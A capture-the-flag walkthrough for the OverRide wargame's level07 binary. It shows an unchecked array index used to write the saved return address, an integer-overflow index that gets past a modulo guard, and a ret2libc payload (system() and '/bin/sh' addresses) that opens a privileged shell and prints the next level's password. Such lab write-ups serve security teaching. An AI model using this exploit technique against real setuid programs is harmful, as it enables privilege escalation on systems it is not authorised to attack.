# Level07 Walkthrough
## Initial Analysis
### 1. Examine the Binary
```bash
level07@OverRide:~$ ls -la
total 17
dr-xr-x---+ 1 level07 level07   80 Sep 13  2016 .
dr-x--x--x  1 root    root     260 Oct  2  2016 ..
-rw-r--r--  1 level07 level07  220 Sep 10  2016 .bash_logout
lrwxrwxrwx  1 root    root       7 Sep 13  2016 .bash_profile -> .bashrc
-rw-r--r--  1 level07 level07 3533 Sep 10  2016 .bashrc
-rwsr-s---+ 1 level08 users   7612 Sep 10  2016 level07
-rw-r--r--+ 1 level07 level07   41 Oct 19  2016 .pass
-rw-r--r--  1 level07 level07  675 Sep 10  2016 .profile
```
**Key observations:**

setuid and setgid binary (s flags in permissions)

Owned by level08 user

When executed, runs with level08 privileges

## 2. Test Basic Execution
```bash
level07@OverRide:~$ ./level07
----------------------------------------------------
Welcome to wil's crappy number storage service!   
----------------------------------------------------
Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
Number: 42
Index: 0
*** ERROR! ***
This index is reserved for wil!
*** ERROR! ***
Failed to do store command
```
**Observations:**

Interactive program with 3 commands: store, read, quit

Stores numbers in an array

Some indices are protected (index 0 is reserved)

## Reverse Engineering
### 3. Function Analysis
```bash
(gdb) info functions
All defined functions:
0x08048470  printf@plt
0x08048480  fflush@plt
0x08048490  getchar@plt
0x080484a0  fgets@plt
0x080484b0  __stack_chk_fail@plt
0x080484c0  puts@plt
0x080484f0  memset@plt
0x08048500  __isoc99_scanf@plt
0x080485c4  clear_stdin
0x080485e7  get_unum
0x0804861f  prog_timeout
0x08048630  store_number
0x080486d7  read_number
0x08048723  main
```
### 4. Understanding the Program
The program:

Clears argv and environment variables (security measure)

Displays a menu

Reads commands: "store", "read", "quit"

For "store": calls store_number() to write a number at a given index

For "read": calls read_number() to read a number from an index

Numbers are stored in an array of 100 integers (int data[100])

### 5. The Vulnerability - No Index Bounds Checking
The program doesn't check if the index is within the array bounds (0-99):

```bash
Input command: store
Number: 42
Index: 160
Completed store command successfully

Input command: read
Index: 160
Number at data[160] is 42
Completed read command successfully

Input command: store
Number: 42
Index: -2
Completed store command successfully

Input command: read
Index: -2
Number at data[4294967294] is 42
Completed read command successfully
We can access any memory location using negative indices or indices > 99!
```
### 6. The Protection
However, there's a protection in store_number():

```assembly
0x08048671: mov    $0xaaaaaaab,%edx
0x08048676: mov    %ecx,%eax
0x08048678: mul    %edx
0x0804867a: shr    %edx
0x0804867c: mov    %edx,%eax
0x0804867e: add    %eax,%eax
0x08048680: add    %edx,%eax
0x08048682: mov    %ecx,%edx
0x08048684: sub    %eax,%edx
0x08048686: test   %edx,%edx
0x08048688: je     0x8048697 <store_number+103>
0x0804868a: mov    -0x10(%ebp),%eax
0x0804868d: shr    $0x18,%eax
0x08048690: cmp    $0xb7,%eax
0x08048695: jne    0x80486c2 <store_number+146>
0x08048697: <+103>: puts(" *** ERROR! ***")
0x0804869e: puts("This index is reserved for wil!")
```
This checks if index % 3 == 0 OR if the high byte of the number is 0xb7 (libc address range). Both are blocked.

So we cannot write to indices divisible by 3, nor can we write numbers in the libc address range.

### 7. Bypassing the Index Protection
We can bypass the index protection using integer overflow:

If we want to write to index 114 (which is divisible by 3), we can use:

```text
index_overflow = (UINT_MAX / 4) + 114 = 1073741824 + 114 = 1073741938
Because:

UINT_MAX = 4294967295

The array is of integers (4 bytes each)

So (UINT_MAX / 4) * 4 wraps around to the same memory location
```
**Test it:**

```bash
Input command: store
Number: 42
Index: 1073741938
Completed store command successfully

Input command: read
Index: 114
Number at data[114] is 42
Completed read command successfully
Now we can write to index 114!
```
## Exploitation Strategy
### 8. Finding the Array Address
We need to find where the array is located to calculate the index of the return address.

Set a breakpoint in read_number():

```bash
(gdb) b read_number
Breakpoint 1 at 0x80486dd
(gdb) r
...
Input command: read

Breakpoint 1, 0x080486dd in read_number ()
(gdb) x/x $ebp+0x8
0xffffd440:     0xffffd464
The array address is at $ebp+0x8 = 0xffffd440

The array itself starts at 0xffffd464
```
### 9. Finding the Index of the Array Address
Difference: 0xffffd440 - 0xffffd464 = -36
Index = -36 / 4 = -9

```bash
Input command: read
Index: -9
Number at data[4294967287] is 4294956132
Completed read command successfully
4294956132 = 0xffffd464 ✓ - this is the array address at runtime!
```
### 10. Finding the Index of the Return Address
Set a breakpoint after the command processing:

```bash
(gdb) b *main+520
Breakpoint 2 at 0x804892b
(gdb) c
Continuing.
Input command: read
Index: -9
Number at data[4294967287] is 4294956132
Completed read command successfully

Breakpoint 2, 0x0804892b in main ()
(gdb) i f
Stack level 0, frame at 0xffffd630:
eip = 0x804892b in main; saved eip 0xf7e45513
...
Saved registers:
eip at 0xffffd62c
EIP is at 0xffffd62c. Difference from array address:
```
```text
0xffffd62c - 0xffffd464 = 456
456 / 4 = 114
The return address is at index 114!
```
### 11. Finding the Addresses
We need:

system() address: 0xf7e6aed0 (decimal: 4159090384)

/bin/sh address: 0xf7f897ec (decimal: 4160264172)

### 12. The Payload
We need to overwrite:

Index 114 with system() address

Index 116 (EIP+2) with /bin/sh address

But index 114 is divisible by 3, so we need to use the overflow trick:

```text
store_index = (4294967296 / 4) + 114 = 1073741938
Index 116 is not divisible by 3, so we can write directly.
```
## Exploitation
### 13. The Commands
```bash
./level07
----------------------------------------------------
Welcome to wil's crappy number storage service!   
----------------------------------------------------
Commands:                                          
    store - store a number into the data storage    
    read  - read a number from the data storage     
    quit  - exit the program                        
----------------------------------------------------
wil has reserved some storage :>                 
----------------------------------------------------

Input command: store
Number: 4159090384    # system() address
Index: 1073741938     # wraps to index 114
Completed store command successfully

Input command: store
Number: 4160264172    # "/bin/sh" address
Index: 116
Completed store command successfully

Input command: quit
$ whoami
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGRk8m
$ exit
```
## Memory Layout Visualization
```text
Stack layout after overwrites:

Higher addresses
┌──────────────────────────┐
│   return address         │ ← 0xffffd62c (index 114) = system()
├──────────────────────────┤
│   ...                    │
├──────────────────────────┤
│   saved ebp              │
├──────────────────────────┤
│   argument for system    │ ← 0xffffd634 (index 116) = "/bin/sh"
├──────────────────────────┤
│   ...                    │
└──────────────────────────┘
Lower addresses
```
When main returns: eip = system("/bin/sh")
## Vulnerability Summary
**Root Cause:**
No bounds checking on array indices

Can read/write anywhere in memory using negative indices

Integer overflow bypasses index protection (index % 3 == 0)

## Exploitation Technique:
Array address discovery: Found using index -9

Return address location: Found at index 114

Index protection bypass: Used integer overflow to write to index 114

Return-to-libc: Overwrote return address with system()

Argument passing: Placed /bin/sh address at index 116

**Key Learning Points:**
Array bounds checking is critical for security

Negative indices can access memory before the array

Integer overflow can bypass modulo protections

Return-to-libc works even with limited protections

Dynamic address discovery is possible through the array itself

## Final Commands
```bash
./level07

# First command: store system() address at index 114 (using overflow)
store
Number: 4159090384
Index: 1073741938

# Second command: store "/bin/sh" address at index 116
store
Number: 4160264172
Index: 116

# Quit to trigger the shell
quit
Password for level08: 7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGRk8m
```
